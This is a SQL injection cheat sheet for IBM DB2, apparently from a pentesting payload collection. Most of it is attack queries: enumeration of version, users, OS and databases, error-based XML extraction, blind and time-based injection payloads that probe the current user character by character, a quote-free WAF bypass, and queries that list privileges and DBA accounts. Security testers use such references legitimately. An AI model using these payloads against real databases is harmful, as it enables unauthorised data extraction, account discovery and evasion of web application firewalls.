# DB2 Injection

> IBM DB2 is a family of relational database management systems (RDBMS) developed by IBM. Originally created in the 1980s for mainframes, DB2 has evolved to support various platforms and workloads, including distributed systems, cloud environments, and hybrid deployments. 


## Summary

* [DB2 Comments](#db2-comments)
* [DB2 Default Databases](#db2-default-databases)
* [DB2 Enumeration](#db2-enumeration)
* [DB2 Methodology](#db2-methodology)
* [DB2 Error Based](#db2-error-based)
* [DB2 Blind Based](#db2-blind-based)
* [DB2 Time Based](#db2-time-based)
* [DB2 WAF Bypass](#db2-waf-bypass)
* [DB2 Accounts and Privileges](#db2-accounts-and-privileges)
* [References](#references) 


## DB2 Comments	

| Type                       | Description                       |
| -------------------------- | --------------------------------- |
| `--`                       | SQL comment                       |


## DB2 Default Databases

| Name        | Description                                                           |
| ----------- | --------------------------------------------------------------------- |
| SYSIBM      | Core system catalog tables storing metadata for database objects.     |
| SYSCAT      | User-friendly views for accessing metadata in the SYSIBM tables.      |
| SYSSTAT     | Statistics tables used by the DB2 optimizer for query optimization.   |
| SYSPUBLIC   | Metadata about objects available to all users (granted to PUBLIC).    |
| SYSIBMADM   | Administrative views for monitoring and managing the database system. |
| SYSTOOLs    | Tools, utilities, and auxiliary objects provided for database administration and troubleshooting. |


## DB2 Enumeration

| Description      | SQL Query |
| ---------------- | ----------------------------------------- |
| DBMS version     | `select versionnumber, version_timestamp from sysibm.sysversions;` |
| DBMS version     | `select service_level from table(sysproc.env_get_inst_info()) as instanceinfo` |
| DBMS version     | `select getvariable('sysibm.version') from sysibm.sysdummy1` |
| DBMS version     | `select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo` |
| DBMS version     | `select service_level,bld_level from sysibmadm.env_inst_info` |
| Current user     | `select user from sysibm.sysdummy1` |
| Current user     | `select session_user from sysibm.sysdummy1` |
| Current user     | `select system_user from sysibm.sysdummy1` |
| Current database | `select current server from sysibm.sysdummy1` |
| OS info          | `select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info` |


## DB2 Methodology

| Description      | SQL Query |
| ---------------- | ------------------------------------ |
| List databases   | `SELECT distinct(table_catalog) FROM sysibm.tables` |
| List databases   | `SELECT schemaname FROM syscat.schemata;` |
| List columns     | `SELECT name, tbname, coltype FROM sysibm.syscolumns` |
| List tables      | `SELECT table_name FROM sysibm.tables` |
| List tables      | `SELECT name FROM sysibm.systables` |
| List tables      | `SELECT tbname FROM sysibm.syscolumns WHERE name='username'` |


## DB2 Error Based

```sql
-- Returns all in one xml-formatted string
select xmlagg(xmlrow(table_schema)) from sysibm.tables

-- Same but without repeated elements
select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)

-- Returns all in one xml-formatted string.
-- May need CAST(xml2clob(… AS varchar(500)) to display the result.
select xml2clob(xmelement(name t, table_schema)) from sysibm.tables 
```


## DB2 Blind Based

| Description      | SQL Query |
| ---------------- | ------------------------------------------ |
| Substring        | `select substr('abc',2,1) FROM sysibm.sysdummy1` |
| ASCII value      | `select chr(65) from sysibm.sysdummy1`     |
| CHAR to ASCII    | `select ascii('A') from sysibm.sysdummy1`  |
| Select Nth Row   | `select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only` |
| Bitwise AND      | `select bitand(1,0) from sysibm.sysdummy1` |
| Bitwise AND NOT  | `select bitandnot(1,0) from sysibm.sysdummy1` |
| Bitwise OR       | `select bitor(1,0) from sysibm.sysdummy1`  |
| Bitwise XOR      | `select bitxor(1,0) from sysibm.sysdummy1` |
| Bitwise NOT      | `select bitnot(1,0) from sysibm.sysdummy1` |


## DB2 Time Based

Heavy queries, if user starts with ascii 68 ('D'), the heavy query will be executed, delaying the response. 

```sql
' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 
```


## DB2 WAF Bypass

### Avoiding Quotes

```sql
SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1
```


## DB2 Accounts and Privileges

| Description      | SQL Query |
| ---------------- | ------------------------------------ |
| List users | `select distinct(grantee) from sysibm.systabauth` |
| List users | `select distinct(definer) from syscat.schemata` |
| List users | `select distinct(authid) from sysibmadm.privileges` |
| List users | `select grantee from syscat.dbauth` |
| List privileges | `select * from syscat.tabauth` |
| List privileges | `select * from SYSIBM.SYSUSERAUTH — List db2 system privilegies` |
| List DBA accounts | `select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'` |
| List DBA accounts | `select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = 'Y' or SYSADMAUTH = 'G'` |
| Location of DB files | `select * from sysibmadm.reg_variables where reg_var_name='DB2PATH'` |


## References

- [DB2 SQL injection cheat sheet - Adrián - May 20, 2012](https://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/)
- [Pentestmonkey's DB2 SQL Injection Cheat Sheet - @pentestmonkey - September 17, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)